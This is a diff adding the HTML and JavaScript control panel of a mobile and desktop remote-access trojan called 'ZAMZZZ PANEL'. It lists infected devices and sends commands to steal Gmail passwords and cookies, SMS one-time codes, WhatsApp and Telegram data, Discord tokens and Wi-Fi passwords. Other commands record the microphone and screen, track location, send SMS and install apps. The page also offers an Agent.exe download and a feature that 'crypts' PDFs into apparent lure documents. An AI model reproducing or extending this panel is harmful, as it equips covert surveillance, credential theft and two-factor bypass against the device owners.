@@ -1,1 +1,295 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🔥 ZAMZZZ PANEL</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0a;color:#00ff41;font-family:'Courier New',monospace;height:100vh;overflow:hidden}
+.container{max-width:1400px;margin:0 auto;padding:10px;height:100vh;display:flex;flex-direction:column}
+.header{border:1px solid #00ff41;padding:12px 20px;background:#0d0d0d;display:flex;justify-content:space-between;align-items:center;border-radius:8px;margin-bottom:10px}
+.header h1{color:#ff1a1a;font-size:22px;letter-spacing:2px;text-shadow:0 0 20px rgba(255,26,26,0.3)}
+.header h1 span{color:#00ff41}
+.header .info{font-size:11px;color:#666}
+.grid{display:grid;grid-template-columns:280px 1fr;gap:10px;flex:1;min-height:0}
+.sidebar{border:1px solid #1a1a1a;border-radius:8px;padding:12px;background:#0d0d0d;overflow-y:auto}
+.sidebar h3{font-size:12px;color:#666;border-bottom:1px solid #1a1a1a;padding-bottom:8px;margin-bottom:8px}
+.device{padding:8px 10px;border:1px solid #1a1a1a;margin:4px 0;border-radius:4px;cursor:pointer;transition:.2s;font-size:12px;background:#0a0a0a}
+.device:hover{border-color:#00ff41}
+.device.active{border-color:#ff1a1a;background:#1a0a0a;box-shadow:0 0 15px rgba(255,26,26,0.2)}
+.device .id{color:#888;font-size:10px}
+.device .os{color:#555;font-size:10px}
+.device .online{color:#00ff41}
+.device .offline{color:#ff1a1a}
+.content{border:1px solid #1a1a1a;border-radius:8px;padding:12px;background:#0d0d0d;display:flex;flex-direction:column;overflow:hidden}
+.content .sel{font-size:13px;color:#666;margin-bottom:8px;padding-bottom:8px;border-bottom:1px solid #1a1a1a}
+.cmd-row{display:grid;grid-template-columns:2fr 1fr;gap:8px;margin-bottom:8px}
+.cmd-row select,.cmd-row input{background:#000;color:#00ff41;border:1px solid #1a1a1a;padding:8px 10px;border-radius:4px;font-family:monospace;font-size:12px;width:100%}
+.cmd-row select option{background:#000}
+.cmd-row select option optgroup{color:#ff1a1a}
+.btn-row{display:grid;grid-template-columns:2fr 1fr;gap:8px;margin-bottom:8px}
+.btn{background:#1a1a1a;color:#00ff41;border:1px solid #1a1a1a;padding:8px;border-radius:4px;cursor:pointer;font-family:monospace;font-size:12px;transition:.2s;font-weight:bold}
+.btn:hover{background:#002200;border-color:#00ff41}
+.btn-exec{background:#ff1a1a;color:#fff;border-color:#ff1a1a}
+.btn-exec:hover{background:#cc0000}
+.btn-bulk{background:#003300;color:#00ff41;border-color:#00ff41}
+.btn-bulk:hover{background:#004400}
+.result{flex:1;border:1px solid #1a1a1a;border-radius:4px;padding:10px;background:#000;overflow-y:auto;font-size:11px;white-space:pre-wrap;min-height:120px;color:#00ff41;margin-top:4px}
+.result .error{color:#ff1a1a}
+.result .success{color:#00ff41}
+.download-area{margin-top:10px;border-top:1px solid #1a1a1a;padding-top:10px}
+.download-area .lbl{font-size:10px;color:#555;display:block;margin-bottom:4px}
+.download-area input[type=file]{background:#000;color:#00ff41;border:1px solid #1a1a1a;padding:6px;border-radius:4px;width:100%;font-size:11px;margin:4px 0}
+.download-area .btn-sm{font-size:11px;padding:6px;margin:3px 0;display:block;text-align:center;text-decoration:none;color:#00ff41;background:#1a1a1a;border:1px solid #1a1a1a;border-radius:4px;cursor:pointer}
+.download-area .btn-sm:hover{background:#002200;border-color:#00ff41}
+.bot-bar{display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px;margin-top:6px}
+::-webkit-scrollbar{width:4px}
+::-webkit-scrollbar-track{background:#0a0a0a}
+::-webkit-scrollbar-thumb{background:#00ff41;border-radius:4px}
+.status-dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:6px}
+.status-dot.online{background:#00ff41;box-shadow:0 0 10px #00ff41}
+.status-dot.offline{background:#ff1a1a;box-shadow:0 0 10px #ff1a1a}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="header">
+<h1>🔥 ZAMZZZ <span>PANEL</span></h1>
+<div class="info"><span id="status">● Connecting</span> | <span id="count">0 Devices</span></div>
+</div>
+<div class="grid">
+<div class="sidebar">
+<h3>📱 DEVICES</h3>
+<div id="devices"><div style="color:#333;text-align:center;padding:20px;font-size:12px">No devices</div></div>
+<div class="download-area">
+<span class="lbl">📥 DOWNLOADS</span>
+<a href="/download_agent" class="btn-sm">⬇ Agent.exe</a>
+<a href="/generate_pdf" class="btn-sm" style="margin-top:4px">📄 Gen PDF</a>
+<span class="lbl" style="margin-top:8px">🔐 CRYPT PDF</span>
+<input type="file" id="pdfFile" accept=".pdf">
+<button class="btn-sm" onclick="cryptPDF()" style="background:#222;width:100%;border:1px solid #00ff41;border-radius:4px;padding:6px;color:#00ff41;cursor:pointer">⚡ Crypt</button>
+</div>
+</div>
+<div class="content">
+<div class="sel" id="selected">🔴 Select a device</div>
+<div class="cmd-row">
+<select id="cmd">
+<optgroup label="🔴 STEAL" style="color:#ff1a1a">
+<option value="gmail_pass">📧 Gmail Passwords</option>
+<option value="gmail_cookie">🍪 Gmail Cookies</option>
+<option value="sms">💬 SMS Inbox</option>
+<option value="sms_sent">💬 SMS Sent</option>
+<option value="sms_otp">🔑 SMS OTP</option>
+<option value="whatsapp">💚 WhatsApp DB</option>
+<option value="telegram">✈️ Telegram Session</option>
+<option value="passwords">🔑 All Passwords</option>
+<option value="wifi">📶 WiFi Passwords</option>
+<option value="discord">🎮 Discord Token</option>
+<option value="screenshot">🖼️ Screenshot</option>
+<option value="clipboard">📋 Clipboard</option>
+<option value="location">📍 Location</option>
+<option value="ip">🌐 IP Address</option>
+<option value="sysinfo">💻 System Info</option>
+<option value="contacts">👤 Contacts</option>
+<option value="calllogs">📞 Call Logs</option>
+<option value="imei">📱 IMEI</option>
+<option value="gallery">🖼️ Gallery Backup</option>
+<option value="photos">📸 Photos List</option>
+<option value="videos">🎬 Videos List</option>
+<option value="photo">📷 Take Photo</option>
+<option value="files">📁 List Files</option>
+<option value="file">📄 Read File</option>
+<option value="mic">🎤 Record Mic</option>
+</optgroup>
+<optgroup label="🎬 RECORD" style="color:#ffaa00">
+<option value="record_screen">📺 Record Screen</option>
+<option value="record_screen_time">⏱️ Record Screen (Time)</option>
+<option value="record_audio">🎵 Record Audio</option>
+</optgroup>
+<optgroup label="⚙️ CONTROL" style="color:#00ff41">
+<option value="tap">👆 Tap</option>
+<option value="swipe">🤚 Swipe</option>
+<option value="type">⌨️ Type</option>
+<option value="back">⬅️ Back</option>
+<option value="home">🏠 Home</option>
+<option value="recent">📋 Recent</option>
+<option value="call">📞 Call</option>
+<option value="endcall">📴 End Call</option>
+<option value="send_sms">💬 Send SMS</option>
+<option value="flash">🔦 Flashlight</option>
+<option value="brightness">☀️ Brightness</option>
+<option value="volume">🔊 Volume</option>
+<option value="vibrate">📳 Vibrate</option>
+<option value="wifi_on">📶 WiFi On</option>
+<option value="wifi_off">📶 WiFi Off</option>
+<option value="bt_on">📡 BT On</option>
+<option value="bt_off">📡 BT Off</option>
+<option value="air_on">✈️ Airplane On</option>
+<option value="air_off">✈️ Airplane Off</option>
+<option value="gps_on">📍 GPS On</option>
+<option value="gps_off">📍 GPS Off</option>
+<option value="dnd_on">🔕 DND On</option>
+<option value="dnd_off">🔕 DND Off</option>
+<option value="mute">🔇 Mute</option>
+<option value="unmute">🔊 Unmute</option>
+<option value="lock">🔒 Lock</option>
+<option value="restart">🔄 Restart</option>
+<option value="shutdown">⏻ Shutdown</option>
+</optgroup>
+<optgroup label="✏️ EDIT" style="color:#ff69b4">
+<option value="wallpaper">🖼️ Change Wallpaper</option>
+<option value="ringtone">🔔 Ringtone</option>
+<option value="alarm">⏰ Alarm</option>
+<option value="notification">🔔 Notification</option>
+<option value="edit_brightness">☀️ Edit Brightness</option>
+<option value="edit_volume">🔊 Edit Volume</option>
+<option value="timezone">🕐 Timezone</option>
+<option value="language">🌐 Language</option>
+</optgroup>
+<optgroup label="📦 APPS" style="color:#9b59b6">
+<option value="install">📥 Install APK</option>
+<option value="uninstall">🗑️ Uninstall App</option>
+<option value="open">🚀 Open App</option>
+</optgroup>
+</select>
+<input id="params" placeholder='{"command":"whoami"}' value='{"command":"whoami"}'>
+</div>
+<div class="btn-row">
+<button class="btn btn-exec" onclick="sendCmd()">▶ EXECUTE</button>
+<button class="btn btn-bulk" onclick="bulk()">⚡ BULK</button>
+</div>
+<div class="result" id="result">[ Waiting for command... ]</div>
+</div>
+</div>
+</div>
+<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+<script>
+const socket = io();
+let selected = null;
 
+socket.on('connect', ()=>{
+    document.getElementById('status').textContent = '● Online';
+    document.getElementById('status').style.color = '#00ff41';
+});
+
+socket.on('disconnect', ()=>{
+    document.getElementById('status').textContent = '● Offline';
+    document.getElementById('status').style.color = '#ff1a1a';
+});
+
+socket.on('new_result', (d)=>{
+    const resultDiv = document.getElementById('result');
+    const status = d.status === 'success' ? '✅' : '❌';
+    const color = d.status === 'success' ? '#00ff41' : '#ff1a1a';
+    resultDiv.innerHTML = `
+        <div style="color:#888;font-size:10px;margin-bottom:5px;">[${d.id}] ${d.action}</div>
+        <div style="color:${color};font-weight:bold;">${status} ${d.status.toUpperCase()}</div>
+        <div style="margin-top:5px;color:#aaa;font-size:11px;">${d.result || 'No output'}</div>
+    `;
+});
+
+function loadDevices(){
+    fetch('/api/clients')
+        .then(r=>r.json())
+        .then(d=>{
+            const el=document.getElementById('devices');
+            if(!d.length){
+                el.innerHTML='<div style="color:#333;text-align:center;padding:20px;font-size:12px">No devices connected</div>';
+                return;
+            }
+            el.innerHTML=d.map(x=>`
+                <div class="device" onclick="select('${x.id}')">
+                    <div class="id">${x.id}</div>
+                    <div class="os">${x.os} - <span class="${x.status}">${x.status}</span></div>
+                </div>
+            `).join('');
+            document.getElementById('count').textContent = d.length + ' Devices';
+        })
+        .catch(()=>{
+            document.getElementById('devices').innerHTML='<div style="color:#ff1a1a;text-align:center;padding:20px;font-size:12px">Error loading devices</div>';
+        });
+}
+
+function select(id){
+    selected = id;
+    document.getElementById('selected').textContent = `✅ Selected: ${id}`;
+    document.getElementById('selected').style.color = '#00ff41';
+    document.querySelectorAll('.device').forEach(e=>e.classList.remove('active'));
+    document.querySelectorAll('.device').forEach(e=>{
+        if(e.textContent.includes(id)) e.classList.add('active');
+    });
+}
+
+function sendCmd(){
+    if(!selected) return alert('⚠️ Select a device first!');
+    const action = document.getElementById('cmd').value;
+    const params = document.getElementById('params').value;
+    try{
+        const parsed = params ? JSON.parse(params) : {};
+        fetch('/api/command', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({id: selected, action: action, params: parsed})
+        })
+        .then(r=>r.json())
+        .then(d=>{
+            if(d.status==='sent'){
+                document.getElementById('result').innerHTML = `<div style="color:#00ff41;">[+] Command "${action}" sent to ${selected}</div>`;
+            } else {
+                document.getElementById('result').innerHTML = `<div style="color:#ff1a1a;">[-] Error: ${d.msg || 'Unknown error'}</div>`;
+            }
+        })
+        .catch(err=>{
+            document.getElementById('result').innerHTML = `<div style="color:#ff1a1a;">[-] Error: ${err}</div>`;
+        });
+    } catch(e){
+        alert('⚠️ Invalid JSON params! Contoh: {"command":"whoami"}');
+    }
+}
+
+function bulk(){
+    if(!selected) return alert('⚠️ Select a device first!');
+    const cmds = ['screenshot','clipboard','wifi','location','ip','sysinfo','contacts','calllogs'];
+    let count = 0;
+    cmds.forEach((c,i)=>{
+        setTimeout(()=>{
+            fetch('/api/command', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({id: selected, action: c, params: {}})
+            });
+            count++;
+        }, i * 500);
+    });
+    document.getElementById('result').innerHTML = `<div style="color:#ffaa00;">⚡ Bulk ${cmds.length} commands sent to ${selected}</div>`;
+}
+
+function cryptPDF(){
+    const file = document.getElementById('pdfFile').files[0];
+    if(!file) return alert('⚠️ Select a PDF file!');
+    const fd = new FormData();
+    fd.append('file', file);
+    document.getElementById('result').innerHTML = '<div style="color:#ffaa00;">⏳ Crypting PDF... Please wait</div>';
+    fetch('/crypt_pdf', {
+        method: 'POST',
+        body: fd
+    })
+    .then(r=>r.blob())
+    .then(b=>{
+        const a = document.createElement('a');
+        a.href = URL.createObjectURL(b);
+        a.download = 'Secure_Document.pdf';
+        a.click();
+        document.getElementById('result').innerHTML = '<div style="color:#00ff41;">✅ PDF crypted successfully! File downloaded.</div>';
+    })
+    .catch(()=>{
+        document.getElementById('result').innerHTML = '<div style="color:#ff1a1a;">❌ Crypt failed!</div>';
+    });
+}
+
+setInterval(loadDevices, 5000);
+loadDevices();
+</script>
+</body>
+  </html>
